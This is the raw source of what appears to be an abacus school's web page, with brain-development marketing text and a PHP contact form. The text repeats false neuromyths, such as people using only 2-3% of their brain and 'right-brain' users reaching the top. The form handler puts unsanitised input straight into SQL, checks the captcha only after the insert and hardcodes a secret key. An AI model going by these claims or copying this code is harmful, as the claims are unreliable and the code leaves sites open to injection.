    				<p>According to the analysis on the development of nerve tissues, the development and growth of the nerve tissues begins in 4 to 6 years old children at a rapid speed, and the progress will slow down when they are 12 years old and growth reaches 75%. The greatest growth of human brain is during 4 to 14 years and during this period, the frequency of the brain wave increases gradually from theta (relaxing stage) to alpha level (relax but conscious). Children in alpha level have plentiful imagination and quicker learning ability. As they grow older into their juvenile age (the beta level, the sober period), thought will become more rational and they mainly think with left brain. Therefore, as a parent to your child, in order to explore and enhance the children’s intelligence, the best learning time for your child is the age before 15.</p>
    			
                </div>
            </div>
    </div>
    <div class="dt-sc-toggle-frame">
      <h5 class="dt-sc-toggle"><a href="#"> <b> How is it helpful ? </b> </a></h5>
        <div class="dt-sc-toggle-content">
            <div class="dt-sc-block">
            				<p>Science has proved that average human utilizes only 2-3% of their brain capacity during their entire life. The brain is divided into two parts: Left and Right hemisphere. The left brain is concerned with analytical information where as right brain with creativity and imagination. Almost 97-98% people use their left brain as the left brain controls our right hand and right brain controls the left hand. There are two modes of thinking: verbal and non-verbal, represented rather separately in left and right hemispheres respectively and that our education system, as well as science in general, tends to neglect the non-verbal form of intellect.</p><br>
            
            				<p>What it comes down to, is that creativity is lost with growing years and hence the ability to memorize is also weakened. Scientific research reveals that a very small percentage of people use their right brain and those who use it are bound to reach the top. Our programme is meant for whole brain development, especially right part of brain. It improves creativity, imagination, idea generation, memory, speed and accuracy etc. and these skills last a life time.</p><br>
            
            				<b>ENERGISES:</b> Imaginative Power, Listening Ability, Visualizing Power, Memory (Retention & Recall), Creativity.<br>
            				<b>ENHANCES:</b> Concentration, Confidence, Speed & Accuracy, Intelligence Quotient (IQ), Self Reliance.
            
            </div>
        </div>
    </div>
</div>

</div>


       </section>
       
</div>


<!--<div class="breadcrumb-section  ">	<div class="container">		<h1>How To Enroll Your Child To A Class</h1><div class="breadcrumb">				-->
<!--					<button id="myBtn"  class="dt-sc-button xlarge burnt-orange" style="float: right;"> Learn More <span class="fa fa-chevron-circle-right"> </span></button></div>	</div></div>-->
					
					










<!--addvertisement start-->


<!-- The Modal -->
<!--<div id="myModaladv"  class="modaladv">-->

  <!-- Modal content -->
<!--  <div class="modal-content1 adv">-->
<!--    <span class="close1">&times;</span>-->
<!-- <div class="">-->
<!--  <form class="contact-form" method="post" action="">-->

<!--<div class="">-->
<!--    <img src="images/bresult1.jpeg" alt="advertisement" title="advertisement" height="auto" width="auto">-->
<!--</div>-->






<!--  </form>-->

<!--</div>-->
<!--  </div>-->

<!--</div>-->

<!--end advertisement-->






<section class="fullwidth-background dt-sc-parallax-section product_bg">

<div class="container">
<h2 class="dt-sc-hr-white-title">Contact Us</h2>


<div class="content-full-width">
<form  class="contact-form" method="post" action="">
<h2>We'd Like to Hear From You!</h2>
<p class="column dt-sc-one-half first">
<input id="name" name="txtname" type="text" placeholder="Name" required="">
</p>
<p class="column dt-sc-one-half">
<input id="email" name="txtemail" type="email" placeholder="Email ID" required="">
</p>
<p class="column dt-sc-one-half first">
<input id="subject" name="txtsubject" type="text" placeholder="Contact" required="">
</p>


            <p class="column dt-sc-one-half">
            <select id="subject" name="txtselect" type="select"  required=""  style="width: 100%;
                padding: 16px 18px;
                font-size: 16px;
                color: #a9a7a7;
                background: #fff;
                border: 1px solid #eaeaea;
                outline: none;
                border-radius: 2px;
                -moz-border-radius: 2px;
                -webkit-border-radius: 2px;">
                <option value="">-Select-</option>
                <option>Franchise</option>
                <option>Teacher</option>
                <option>School</option>
                <option>student</option>
                <option>Others</option>
            
            </select>
            </p>

            <p> 
                <textarea id="comment" name="txtmessage" placeholder="Message"></textarea>
            </p>
            
            <div id="ajax_contact_msg"> </div>
                <div class="g-recaptcha brochure__form__captcha" data-sitekey="6LfNeLgkAAAAAB6AjPP-N4LTvQVKd_P4QiBU2Ifh"></div>
            <p>
                <button name="submit" type="submit" id="submit" class="dt-sc-button medium" value="Send Email">Submit</button>
            </p>
</form>


<?php
function reCaptcha($recaptcha){
  $secret = "6LfNeLgkAAAAAI81E9F_E_qkSzMpIqZARfWiv_SD";
  $ip = $_SERVER['REMOTE_ADDR'];

  $postvars = array("secret"=>$secret, "response"=>$recaptcha, "remoteip"=>$ip);
  $url = "https://www.google.com/recaptcha/api/siteverify";
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $url);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_TIMEOUT, 10);
  curl_setopt($ch, CURLOPT_POSTFIELDS, $postvars);
  $data = curl_exec($ch);
  curl_close($ch);

  return json_decode($data, true);
}
?>
 <?php 
        if(isset($_POST['submit']))
        {

        $txtname=$_POST['txtname'];
        $txtemail=$_POST['txtemail'];
        $txtsubject=$_POST['txtsubject'];
        $txtmessage=$_POST['txtmessage'];
        $txtselect=$_POST['txtselect'];
        


        $ad_prdt="insert into contactform set
        txtname='$txtname',
        txtemail='$txtemail',
        txtsubject='$txtsubject',
        txtselect='$txtselect',
        txtmessage='$txtmessage'";

        $qst_ad_prdt=$db->query($ad_prdt);

        if($qst_ad_prdt)


        
        {
    $recaptcha = $_POST['g-recaptcha-response'];
    $res = reCaptcha($recaptcha);
    if($res['success']){
      // Send email
    }else{
      // Error
    }
             include('contact-form-mail.php');
        echo "<script>window.alert('Submited Successfully');window.location='';</script>";

        }
        else
        {
            echo "<script>window.alert('Error');window.location='';</script>";
        }


        }
        ?>
</div>


</div>

</section>

</section>

</div>


<?php include_once "footer.php";?>

</div>
<a href="" title="Go to Top" class="back-to-top">To Top ↑</a>


<!--<div id='loginstd'>-->
<!--    <a href="https://exam.jigsawabacus.com/public/student_login" target="_blank">-->
<!--    <img src="images/icons/student-log-btn.png" alt="image" title="abacus"  style="height:50px; margin-left:20px; border-radius:20px;">-->
<!--    </a>-->
<!--</div>-->







<script type="text/javascript" src="js/jquery.js"></script>
<script type="text/javascript" src="js/jquery-migrate.min.js"></script>
<script type="text/javascript" src="js/jquery.validate.min.js"></script>
<script type="text/javascript" src="js/jquery-easing-1.3.js"></script>
<script type="text/javascript" src="js/jquery.sticky.js"></script>
<script type="text/javascript" src="js/jquery.nicescroll.min.js"></script>
<script type="text/javascript" src="js/jquery.inview.js"></script>
<script type="text/javascript" src="js/validation.js"></script>
<script type="text/javascript" src="js/jquery.tipTip.minified.js"></script>
<script type="text/javascript" src="js/jquery.bxslider.min.js"></script>
<script type="text/javascript" src="js/jquery.prettyPhoto.js"></script>
<script type="text/javascript" src="js/twitter/jquery.tweet.min.js"></script>
<script type="text/javascript" src="js/jquery.parallax-1.1.3.js"></script>
<script type="text/javascript" src="js/shortcodes.js"></script>
<script type="text/javascript" src="js/custom.js"></script>

<script type="text/javascript" src="js/jquery-transit-modified.js"></script>
<script type="text/javascript" src="js/layerslider.kreaturamedia.jquery.js"></script>
<script type='text/javascript' src="js/greensock.js"></script>
<script type='text/javascript' src="js/layerslider.transitions.js"></script>

<script type="text/javascript">var lsjQuery = jQuery;</script>
<script type="text/javascript"> lsjQuery(document).ready(function() { if(typeof lsjQuery.fn.layerSlider == "undefined") { lsShowNotice('layerslider_1','jquery'); } else { lsjQuery("#layerslider_4").layerSlider({responsiveUnder: 1170, layersContainer: 1170, skinsPath: 'js/layerslider/skins/'}) } }); </script>





<script src="https://www.google.com/recaptcha/api.js"></script>



<!-- Google Tag Manager (noscript) -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-NP76VR6"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<!-- End Google Tag Manager (noscript) -->



</body>


</html>


</html>